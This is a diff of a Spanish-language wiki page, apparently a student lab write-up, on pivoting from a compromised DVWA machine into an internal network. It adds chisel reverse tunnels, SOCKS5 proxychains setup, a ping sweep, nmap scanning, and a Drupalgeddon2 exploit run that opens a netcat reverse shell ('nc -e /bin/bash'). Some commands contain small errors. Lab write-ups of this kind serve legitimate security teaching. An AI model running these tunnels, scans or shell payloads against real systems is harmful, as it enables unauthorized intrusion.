@@ -2,7 +2,7 @@
 title: Practica de pivotaje
 description: En está pagina vamos a explicar como se hizo el pivotaje
 published: true
-date: 2024-12-11T18:55:20.308Z
+date: 2024-12-16T20:16:33.815Z
 tags: 
 editor: markdown
 dateCreated: 2024-12-11T17:47:05.082Z
@@ -61,9 +61,8 @@ vim /var/www/internal/index.html
 ```
 
 Aquí pondremos lo que querramos para verificar que se ha hecho el pivotaje, un buen ejemplo puede ser:
-"<h1 HOLAAA /h1>"
-> Recuerda poner correctamente el <>.
-{.is-warning}
+\<h1> HOLAAA </h1\>
+
 
 ## Ejecución
 ### Control de DVWA
@@ -110,19 +109,73 @@ Perfecto, ahora vamos a modificar el Socks5. Esto es para poder establecer una c
 nano /etc/proxychains4.conf
 ```
 Deberemos fijarnos que en la primera zonas de texto, esté presente **strict_chain** y después al final deberemos comentar la linea **socks4 127.0.0.1 9050**, y escribiremos en su lugar **socks5 127.0.0.1 1080**.
-![image.png](/image.png)
+![image.png](/imagen_hacking_pivotaje_1.png)
 
 Luego en la herramienta de FoxyProxy, vamos a añadir una nueva entrada con lo siguiente:
 ![imagen_hacking_pivotaje_2.png](/imagen_hacking_pivotaje_2.png)
+
+> No lo activamos todavia
+{.is-warning}
 
 Tras esto, tendremos listo un proxy que puede analizar todas las peticiones como si estuvieramos viendolo desde el seridor DVWA.
 
 Lo siguiente que haremos será establecer la conexión con chisel para poder, para ello en Kali escribiremos: 
 ```console
+./chisel server -p 4000 --reverse
+```
+
+En nuestra maquina vulnerada (DVWA), deberemos escrbir lo siguiente:
+```console
+./chisel client (ip kali):4000 R:8000:127.0.0.1:8000
+```
+
+Si todo va bien, desde nuestra maquina local podremos buscar el servidor local que hicimos en DVWA:
+![imagen_hacking_pivotaje_3.png](/imagen_hacking_pivotaje_3.png)
+
+
+Ahora vamos a usar el socks5 que configuramos anteriormente. Para ello deberemos poner en nuestra maquina local:
+```console
 ./chisel server -p 4000 --reverse --socks5
 ```
 
-
+Y en nuestra maquina DVWA, vamos a poner:
 ```console
-./chisel client (ip kali):4000 R:8000:127.0.0.1:8000
+./chisel server -p 4000 --reverse R:socks
+```
+
+
+Tras esto, si activamos el proxy, podremos hacer la busqueda del servidor directametne en el navegador.
+
+### Entrar en Debian
+Para poder tener acceso a este nuevo servidor, como ya tenemos una shell ocupada con la comunicaciones, vamos a abrir un nueva shell. Para ello deberemos hacer los mismos paso que hicimos anteriormente (nc -lnvp).
+Una vez tengamos una nueva shell, vamos a intentar descubrir las IP locales en esta red, para ello primero hacemos:
+```script
+ip a
+```
+
+Y una vez sepamos el rango de la IP, en mi caso 10.0.0.6/24. Vamos a poner un pequeño script en la máquina DVWA para detectar el resto de IPs, el escript es el siguiente:
+```bash
+for j in $(seq 1 10);do ping -c 10.0.3.$j > /dev/null && echo "host activo 10.0.3.$j";done
+```
+Esto nos devolverá un listado grande de IPs por lo que deberemos deducir cuál es el server, para ello podemos hacer uso de nmpa con:
+```bash
+proxychains4 -q nmap -sT -Pn 10.0.3.4
+```
+> Ir probando la IP con cada uno de los resultados para ver los puertos disponibles.
+{.is-info}
+
+Cuando entramos en el website, podemos descrubir que es un servidor Drupal con una vulnerabilidad de Drupalgeddon2. Por lo que podemos usar el exploit (Disponible en GitHub), para poder explotarlo.
+
+Una vez tengamos el exploit disponible vamos a realizar lo siguiente:
+- En una terminal de DVWA vamos a poner:
+```bash
+./chisel client (kali):4000 0.0.0.0:9999:(kali):9999
+```
+- En una terminal de kali:
+```bash
+nc -lnvp 9999
+```
+- En otra terminal de kali, sin cerrar la anterior:
+```bash
+proxychains 4 -q python2 exploit.py -h http://(ip/ dc-1) -c 'nohup nc -e /bin/bash (Ip Dvwa) 9999 &'
 ```
